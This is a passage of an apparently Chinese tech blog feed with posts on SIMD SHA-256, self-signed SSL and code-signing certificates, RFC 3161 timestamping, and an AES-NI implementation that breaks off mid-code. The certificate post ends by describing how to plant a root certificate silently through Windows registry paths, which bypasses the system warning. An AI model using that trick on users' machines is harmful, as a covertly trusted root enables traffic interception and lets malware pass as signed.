title="压缩"></a>压缩</h1><p>使用字和轮常量进行计算，共计算64轮</p><p><img src="/articles/simdsha256/4.png"></p><p><code>_mm_sha256rnds2_epu32(xmm1, xmm2/m128, &lt;XMM0&gt;)</code></p><p><code>(C, D, G, H)</code>由xmm1提供，<code>(A, B, E, F)</code>由xmm2提供</p><p>XMM0为消息字与轮常量之和</p><p>执行两轮压缩，返回更新后的<code>(A, B, E, F)</code></p><p>按照压缩函数循环移位机制，调用两次交替更新<code>(A, B, E, F)</code>和<code>(C, D, G, H)</code>作为四轮</p><p><code>_mm_sha256rnds2_epu32</code>只会取XMM0的低64位，高64位则被直接忽略。因此第二次调用时需要用<code>_mm_shuffle_epi32</code>把高64位重排到低64位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//预计算：消息 + 轮常量</span><br>__m128i MSG = _mm_add_epi32(MSG0, _mm_set_epi64x(<span class="hljs-number">0xE9B5DBA5B5C0FBCFULL</span>, <span class="hljs-number">0x71374491428A2F98ULL</span>));<br><br><span class="hljs-comment">//执行前两轮压缩，更新CDGH</span><br>CDGH = _mm_sha256rnds2_epu32(CDGH, ABEF, MSG);<br><br><span class="hljs-comment">//高64位重排到低64位，执行后两轮压缩，更新ABEF</span><br>ABEF = _mm_sha256rnds2_epu32(ABEF, CDGH, _mm_shuffle_epi32(MSG, _MM_SHUFFLE(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)));<br></code></pre></td></tr></table></figure><h1 id="完整实现"><a href="#完整实现" class="headerlink" title="完整实现"></a>完整实现</h1><p>库（单头文件）：<a href="https://github.com/Brassinolide/SIMD-SHA256">https://github.com/Brassinolide/SIMD-SHA256</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用自签名证书用于ssl通信</title>
    <link href="/articles/selfsigning/"/>
    <url>/articles/selfsigning/</url>
    
    <content type="html"><![CDATA[<p>本文章所有代码都打包了，下载地址：<a href="selfsigning.rar">selfsigning.rar</a></p><h1 id="签发根证书"><a href="#签发根证书" class="headerlink" title="签发根证书"></a>签发根证书</h1><p>创建配置文件<code>root.cnf</code>，内容如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[ req ]</span><br><span class="hljs-attr">x509_extensions</span> = root_ca<br><br><span class="hljs-section">[ root_ca ]</span><br><span class="hljs-attr">basicConstraints</span> = critical, CA:<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>签发根证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl req -x509 -newkey rsa:2048 -out root.cer -outform PEM -keyout root.pvk -days 10000 -verbose -config root.cnf -nodes -sha256 -subj &quot;/CN=OpenTrust Root&quot;<br></code></pre></td></tr></table></figure><p><code>OpenTrust</code>是我们虚构的一个公司，这样比较正式一点吧（笑</p><p>生成的<code>root.cer</code>是公钥，<code>root.pvk</code>是私钥，然后把<code>root.cer</code>导入到用户的<code>受信任的根证书颁发机构</code>里</p><p><img src="/articles/selfsigning/1.png"></p><h1 id="签发ssl证书"><a href="#签发ssl证书" class="headerlink" title="签发ssl证书"></a>签发ssl证书</h1><p>创建配置文件<code>serverAuth.ext</code>，内容如下</p><p>域名或IP地址根据需要修改</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">subjectAltName</span> = @server<br><span class="hljs-attr">extendedKeyUsage</span> = serverAuth<br><br><span class="hljs-section">[server]</span><br><span class="hljs-comment"># 域名（多个域名就DNS.2、DNS.3类推，IP下同）</span><br><span class="hljs-attr">DNS.1</span> = localhost<br><span class="hljs-comment"># IP地址（v4或v6）</span><br><span class="hljs-attr">IP.1</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">117.122</span><br><span class="hljs-attr">IP.2</span> = fe80::<span class="hljs-number">9</span>fec:b699:<span class="hljs-number">19</span>fb:<span class="hljs-number">850</span>e<br></code></pre></td></tr></table></figure><p>然后创建签名请求文件<code>serverAuth.req</code>并签名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">创建签名请求</span><br>openssl req -newkey rsa:2048 -keyout serverAuth.pvk -out serverAuth.req -subj /CN=&quot;OpenTrust ServerAuth&quot; -sha256 -nodes<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">签名</span><br>openssl x509 -req -CA root.cer -CAkey root.pvk -in serverAuth.req -out serverAuth.cer -days 10000 -extfile serverAuth.ext -sha256<br></code></pre></td></tr></table></figure><p><code>serverAuth.cer</code>是公钥，<code>serverAuth.pvk</code>是私钥，签名请求文件<code>serverAuth.req</code>就可以删掉了</p><p>写个服务器测试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> https = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;https&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> options = &#123;<br><span class="hljs-attr">key</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;serverAuth.pvk&#x27;</span>),<br><span class="hljs-attr">cert</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;serverAuth.cer&#x27;</span>)<br>&#125;;<br><br>https.<span class="hljs-title function_">createServer</span>(options, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;hello world&#x27;</span>);<br>&#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">443</span>);<br></code></pre></td></tr></table></figure><p><img src="/articles/selfsigning/2.png"></p><p>赏心悦目的绿色，不错不错</p><h1 id="签发应用签名证书"><a href="#签发应用签名证书" class="headerlink" title="签发应用签名证书"></a>签发应用签名证书</h1><p>应用签名的签发步骤和ssl是一样的，只不过配置文件需要改一下</p><p>创建配置文件<code>codeSigning.ext</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">extendedKeyUsage</span> <span class="hljs-operator">=</span> codeSigning<br></code></pre></td></tr></table></figure><p>是的，就一行，非常简洁</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">创建签名请求</span><br>openssl req -newkey rsa:2048 -keyout codeSigning.pvk -out codeSigning.req -subj /CN=&quot;OpenTrust CodeSigning&quot; -sha256 -nodes<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">签名</span><br>openssl x509 -req -CA root/root.cer -CAkey root/root.pvk -in codeSigning.req -out codeSigning.cer -days 10000 -extfile config/codeSigning.ext -sha256<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">pvk转pfx，因为Windows SDK自带的签名软件signtool.exe只支持pfx</span><br>openssl pkcs12 -export -out codeSigning.pfx -inkey codeSigning.pvk -in codeSigning.cer -certfile root/root.cer -passout pass:<br></code></pre></td></tr></table></figure><p>然后删掉<code>codeSigning.req</code> <code>codeSigning.cer</code> <code>codeSigning.pvk</code>，我们只需要<code>codeSigning.pfx</code></p><p>签名<code>example.exe</code>，这里上sha1 + sha256双签名，看着就高端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">signtool.exe sign /v /f codeSigning.pfx /fd sha1 example.exe<br>signtool.exe sign /as /v /f codeSigning.pfx /fd sha256 example.exe<br></code></pre></td></tr></table></figure><p><img src="/articles/selfsigning/3.png"></p><h1 id="Windows内核签名"><a href="#Windows内核签名" class="headerlink" title="Windows内核签名"></a>Windows内核签名</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">extendedKeyUsage</span> = <span class="hljs-number">1.3.6.1</span>.<span class="hljs-number">4.1.311.10</span>.<span class="hljs-number">3</span>.<span class="hljs-number">5</span>, <span class="hljs-number">1.3.6.1</span>.<span class="hljs-number">4.1.311.10</span>.<span class="hljs-number">3</span>.<span class="hljs-number">5</span>.<span class="hljs-number">1</span>, codeSigning<br></code></pre></td></tr></table></figure><p>这个好像实现不了，无论怎么搞都会报错无法加载。微软对内核的管理越来越严格，想必是使用了什么申必手段来检查自签名，，，</p><p><img src="/articles/selfsigning/4.png"></p><h1 id="注册表导入根证书"><a href="#注册表导入根证书" class="headerlink" title="注册表导入根证书"></a>注册表导入根证书</h1><p>正常手段导入windows会显示警告，用注册表导入就悄无声息（笑</p><p>用户根证书路径</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\SystemCertificates\Root\Certificates\[证书指纹]<br></code></pre></td></tr></table></figure><p>计算机根证书路径</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\SystemCertificates\ROOT\Certificates\[证书指纹]<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\[证书指纹]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用免费时间戳服务器签名任意文件，保护知识产权</title>
    <link href="/articles/tsa/"/>
    <url>/articles/tsa/</url>
    
    <content type="html"><![CDATA[<h1 id="时间戳签名"><a href="#时间戳签名" class="headerlink" title="时间戳签名"></a>时间戳签名</h1><p>时间戳签名的主要用途是提供一个文件或数据在某个特定时间点存在的无可争议的证明</p><p>假设我编写了一篇文章，并将其进行时间戳签名。在未来，有人盗取了这篇文章，我就可以提供时间戳签名来证明我最初拥有这篇文章，从而维护自己的知识产权</p><p>免费的时间戳服务器（TSA, Time-Stamp Authority）有很多，最好选一个有足够公信力比较靠谱的大厂</p><p>这里选择<a href="https://www.globalsign.com/">globalsign</a>，老牌大厂，公信力足够高，TSA服务器地址为<a href="http://rfc3161timestamp.globalsign.com/advanced">http://rfc3161timestamp.globalsign.com/advanced</a></p><p>签名步骤为：<code>创建时间戳请求文件 -&gt; 发送到TSA服务器进行签名 -&gt; 保管好签名证书和源文件，并在未来必要时进行验证</code></p><p>假设文件为example.txt，以下使用openssl进行演示</p><p>创建时间戳请求文件（TSQ），openssl的默认哈希算法是sha256</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl ts -query -data example.txt -cert -no_nonce -out example.tsq<br></code></pre></td></tr></table></figure><p>发送到TSA服务器，签名时间戳</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -H &quot;Content-Type: application/timestamp-query&quot; --data-binary @example.tsq http://rfc3161timestamp.globalsign.com/advanced -o example.tsr<br></code></pre></td></tr></table></figure><p>example.tsr就是签名完的时间戳证书，现在把example.tsr文件和example.txt只读备份保存好，tsq文件就可以删掉了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看tsr证书内容</span><br>openssl ts -reply -in example.tsr -text<br><span class="hljs-meta prompt_">#</span><span class="language-bash">验证签名</span><br>openssl ts -verify -in example.tsr -data example.txt -CAfile r6.pem<br></code></pre></td></tr></table></figure><p>显示<code>Verification: OK</code>就是验证成功</p><p><code>r6.pem</code>是globalsign的公钥，可以从以下地址获取<a href="https://support.globalsign.com/ca-certificates/root-certificates/globalsign-root-certificates">https://support.globalsign.com/ca-certificates/root-certificates/globalsign-root-certificates</a></p><p><img src="/articles/tsa/1.png"></p><p>注意一个小坑：pem格式是base64编码，不要直接点击下载<code>Download Certificate</code>，点击<code>View in Base64</code>把base64复制下来到自己创建的r6.pem文件中</p><h1 id="python自动化"><a href="#python自动化" class="headerlink" title="python自动化"></a>python自动化</h1><p>用openssl要输入很多指令，太麻烦，所以可以用python自动化实现</p><p><a href="https://github.com/wbond/asn1crypto">asn1crypto</a>库可以创建和解析asn.1结构</p><p>以下代码计算文件的sha256并创建tsq</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> asn1crypto <span class="hljs-keyword">import</span> tsp, core<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha256_file</span>(<span class="hljs-params">file_path:<span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    sha256_hash = hashlib.sha256()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> byte_block <span class="hljs-keyword">in</span> <span class="hljs-built_in">iter</span>(<span class="hljs-keyword">lambda</span>: f.read(<span class="hljs-number">50</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>), <span class="hljs-string">b&quot;&quot;</span>):<br>            sha256_hash.update(byte_block)<br>    <span class="hljs-keyword">return</span> sha256_hash.digest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_tsq</span>(<span class="hljs-params">file_path:<span class="hljs-built_in">str</span>, set_nonce:<span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>, require_cert:<span class="hljs-built_in">bool</span>=<span class="hljs-literal">False</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-keyword">return</span> tsp.TimeStampReq(&#123;<br>        <span class="hljs-string">&#x27;version&#x27;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&#x27;message_imprint&#x27;</span>: tsp.MessageImprint(&#123;<br>            <span class="hljs-string">&#x27;hash_algorithm&#x27;</span>: &#123;<span class="hljs-string">&#x27;algorithm&#x27;</span>: <span class="hljs-string">&#x27;sha256&#x27;</span>&#125;,<br>            <span class="hljs-string">&#x27;hashed_message&#x27;</span>: sha256_file(file_path)<br>        &#125;),<br>        <span class="hljs-string">&#x27;nonce&#x27;</span>: core.Integer(random.getrandbits(<span class="hljs-number">64</span>)) <span class="hljs-keyword">if</span> set_nonce <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>        <span class="hljs-string">&#x27;cert_req&#x27;</span>: require_cert<br>    &#125;).dump()<br></code></pre></td></tr></table></figure><p>发送到TSA服务器签名后保存到tsr文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">requests_tsa</span>(<span class="hljs-params">tsa:<span class="hljs-built_in">str</span>, tsq:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    response = requests.post(tsa, headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/timestamp-query&quot;</span>&#125;, data=tsq)<br>    response.raise_for_status()<br>    <span class="hljs-keyword">return</span> response.content<br><br>file = <span class="hljs-string">&#x27;example.txt&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file + <span class="hljs-string">&quot;.tsr&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(requests_tsa(<span class="hljs-string">&#x27;http://rfc3161timestamp.globalsign.com/advanced&#x27;</span>, get_file_tsq(file)))<br></code></pre></td></tr></table></figure><p>完整的命令行工具，详见 <a href="https://github.com/Brassinolide/pyts">https://github.com/Brassinolide/pyts</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【编程】AES-NI指令集实现快速AES加解密</title>
    <link href="/articles/simd_aes/"/>
    <url>/articles/simd_aes/</url>
    
    <content type="html"><![CDATA[<h1 id="AES基本流程"><a href="#AES基本流程" class="headerlink" title="AES基本流程"></a>AES基本流程</h1><p>AES-NI指令集封装好了AES的所有步骤，所以我们没有必要了解每一步的实现方法，只需要了解基本流程就可以了</p><p>密钥长度可为128、192、256比特，分别为10轮、12轮、14轮</p><p>明文长度都为128比特</p><p>在128比特密钥长度中，密钥被拓展成44个四字节数组（uint32_t roundKeys[44]），每轮取4个作为轮密钥</p><p>不过我们用SIMD实现，一个元素有16字节大，那就是11个（__m128i roundKeys[11]），每轮取一个作为轮密钥</p><p>密钥拓展流程：<code>字循环 -&gt; 字节代换 -&gt; 轮常量异或</code></p><p><img src="/articles/simd_aes/5.png"></p><p>加密流程：开始时，进行一次<code>轮密钥加</code>（就是异或运算）；之后的每一轮，都是<code>字节替换 -&gt; 行移位 -&gt; 列混合 -&gt; 轮密钥加</code>；最后一轮，进行<code>字节替换 -&gt; 行移位 -&gt; 轮密钥加</code></p><p><img src="/articles/simd_aes/4.png"></p><p>注意最后一轮没有列混合，使用的SIMD指令也是不同的（列混合是一个线性变换，它不会增加最后一轮的安全性）</p><h1 id="检测CPU是否支持必须的指令集"><a href="#检测CPU是否支持必须的指令集" class="headerlink" title="检测CPU是否支持必须的指令集"></a>检测CPU是否支持必须的指令集</h1><p>以下代码获取cpuid并检测是否支持SSE2和AES-NI指令集</p><p>只要不是什么老古董大头电脑，都应该支持，除非用户在BIOS里手动关闭了这些功能</p><p>参考intel开发手册<code>CPUID—CPU Identification</code> <code>Table 3-19. Feature Information Returned in the ECX Register</code> <code>Table 3-20. More on Feature Information Returned in the EDX Register</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CheckCPUCapability</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> i[<span class="hljs-number">4</span>];<br>    __cpuid(i, <span class="hljs-number">1</span>);<br>    <span class="hljs-type">bool</span> AES_NI = i[<span class="hljs-number">2</span>] &amp; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">25</span>);<br>    <span class="hljs-type">bool</span> SSE2 = i[<span class="hljs-number">3</span>] &amp; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">26</span>);<br>    <span class="hljs-keyword">return</span> AES_NI &amp;&amp; SSE2;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Unaligned和Aligned指令"><a href="#Unaligned和Aligned指令" class="headerlink" title="Unaligned和Aligned指令"></a>Unaligned和Aligned指令</h1><p><code>Aligned</code>：要求数据内存地址必须对其，可以提升效率，例如<code>MOVDQA</code>指令（<code>_mm_load_si128</code> <code>_mm_store_si128</code>）</p><p><code>Unaligned</code>：不要求数据对其，例如<code>MOVDQU</code>指令（<code>_mm_loadu_si128</code> <code>_mm_storeu_si128</code>）</p><p>下文中，所有代码都使用Aligned指令</p><h1 id="基本SIMD操作"><a href="#基本SIMD操作" class="headerlink" title="基本SIMD操作"></a>基本SIMD操作</h1><p>实现AES之前，先来了解一下基本的SIMD操作</p><p>我们使用SDK封装好的函数，不需要写汇编，编译器自动帮你隐藏了很多底层细节</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//加载内存到xmm寄存器</span><br>_mm_load_si128(ptr_to_memory)<br><br><span class="hljs-comment">//保存xmm寄存器到内存</span><br>_mm_store_si128(ptr_to_memory, xmm_reg)<br><br><span class="hljs-comment">//异或运算</span><br>_mm_xor_si128(xmm_reg, xmm_reg)<br><br><span class="hljs-comment">//左移位运算，以字节为单位（别和C语言中的&lt;&lt;运算搞混了，那个以比特为单位）</span><br>_mm_slli_si128(xmm_reg, imm)<br><br><span class="hljs-comment">//32位重排运算</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">通过一个控制掩码来指定如何从输入向量中选择元素，并将这些元素放入结果向量的对应位置</span><br><span class="hljs-comment">控制掩码可以使用宏 _MM_SHUFFLE 创建，_MM_SHUFFLE 中的四个参数为向量元素的索引，顺序是反过来的（真是反直觉</span><br><span class="hljs-comment">比如调用 _mm_shuffle_epi32([A, B, C, D], _MM_SHUFFLE(0, 1, 2, 3))，结果是[D, C, B, A]</span><br><span class="hljs-comment">*/</span><br>_mm_shuffle_epi32(xmm_reg, imm)<br><br><span class="hljs-comment">//AES密钥拓展辅助函数</span><br>_mm_aeskeygenassist_si128(xmm_reg, imm)<br><br><span class="hljs-comment">//进行一轮AES加密</span><br>_mm_aesenc_si128(xmm_reg, xmm_reg)<br><br><span class="hljs-comment">//进行最后一轮AES加密</span><br>_mm_aesenclast_si128(xmm_reg, xmm_reg)<br><br><span class="hljs-comment">//逆列混淆，解密要用到</span><br>_mm_aesimc_si128(xmm_reg)<br></code></pre></td></tr></table></figure><h1 id="实现AES"><a href="#实现AES" class="headerlink" title="实现AES"></a>实现AES</h1><h2 id="密钥拓展"><a href="#密钥拓展" class="headerlink" title="密钥拓展"></a>密钥拓展</h2><p><img src="/articles/simd_aes/6.jpeg"></p><p>图片来源<a href="https://blog.csdn.net/gulang03/article/details/81175854">https://blog.csdn.net/gulang03/article/details/81175854</a></p><p>参考图片可知，本轮的轮密钥由上一轮的轮密钥确定</p><p>轮常量Rcon是固定的，为[0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]</p><p>你问我为什么轮常量是这些数？AES算法又不是我发明的，我哪里知道（笑</p><p>第一轮的轮密钥无需计算，直接用<code>_mm_load_si128</code>加载进来便是</p><p>后面每一轮i的轮密钥都按以下方式计算</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++">W[<span class="hljs-number">4</span>i] = W[<span class="hljs-number">4</span>i<span class="hljs-number">-4</span>] ⨁ _mm_aeskeygenassist_si128(W[<span class="hljs-number">4</span>i<span class="hljs-number">-1</span>])<br>W[<span class="hljs-number">4</span>i<span class="hljs-number">+1</span>] = W[<span class="hljs-number">4</span>i] ⨁ W[<span class="hljs-number">4</span>i<span class="hljs-number">-3</span>]<br>W[<span class="hljs-number">4</span>i<span class="hljs-number">+2</span>] = W[<span class="hljs-number">4</span>i<span class="hljs-number">+1</span>] ⨁ W[<span class="hljs-number">4</span>i<span class="hljs-number">-2</span>]<br>W[<span class="hljs-number">4</span>i<span class="hljs-number">+3</span>] = W[<span class="hljs-number">4</span>i<span class="hljs-number">+2</span>] ⨁ W[<span class="hljs-number">4</span>i<span class="hljs-number">-1</span>]<br></code></pre></td></tr></table></figure><p>举个例子，第二轮的轮密钥为</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++">W[<span class="hljs-number">4</span>] = W[<span class="hljs-number">0</span>] ⨁ _mm_aeskeygenassist_si128(W[<span class="hljs-number">3</span>])<br>W[<span class="hljs-number">5</span>] = W[<span class="hljs-number">1</span>] ⨁ W[<span class="hljs-number">4</span>]<br>W[<span class="hljs-number">6</span>] = W[<span class="hljs-number">2</span>] ⨁ W[<span class="hljs-number">5</span>]<br>W[<span class="hljs-number">7</span>] = W[<span class="hljs-number">3</span>] ⨁ W[<span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><p>上面是伪代码，下面是代码实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> __m128i <span class="hljs-title">AES_ExpandKey</span><span class="hljs-params">(__m128i key, __m128i generatedKey)</span> </span>&#123;<br>    generatedKey = _mm_shuffle_epi32(generatedKey, _MM_SHUFFLE(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>));<br>    key = _mm_xor_si128(key, _mm_slli_si128(key, <span class="hljs-number">4</span>));<br>    key = _mm_xor_si128(key, _mm_slli_si128(key, <span class="hljs-number">4</span>));<br>    key = _mm_xor_si128(key, _mm_slli_si128(key, <span class="hljs-number">4</span>));<br>    <span class="hljs-keyword">return</span> _mm_xor_si128(key, generatedKey);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">AES_GetRoundKeys</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> key[<span class="hljs-number">16</span>], __m128i roundKey[<span class="hljs-number">11</span>])</span> </span>&#123;<br>    roundKey[<span class="hljs-number">0</span>] = _mm_load_si128((<span class="hljs-type">const</span> __m128i*)(key));<br><br>    <span class="hljs-comment">//不能用循环！不能用循环！_mm_aeskeygenassist_si128第二个参数必须是编译时常量</span><br>    roundKey[<span class="hljs-number">1</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">0</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">0</span>], <span class="hljs-number">0x01</span>));<br>    roundKey[<span class="hljs-number">2</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">1</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">1</span>], <span class="hljs-number">0x02</span>));<br>    roundKey[<span class="hljs-number">3</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">2</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">2</span>], <span class="hljs-number">0x04</span>));<br>    roundKey[<span class="hljs-number">4</span>] = <span class="hljs-built_in">AES_ExpandKey</span>(roundKey[<span class="hljs-number">3</span>], _mm_aeskeygenassist_si128(roundKey[<span class="hljs-number">3</span>], <span class="hljs-number">0x08</span>));<br>    roundKey[<span class="hljs-number">5</span>] = <span 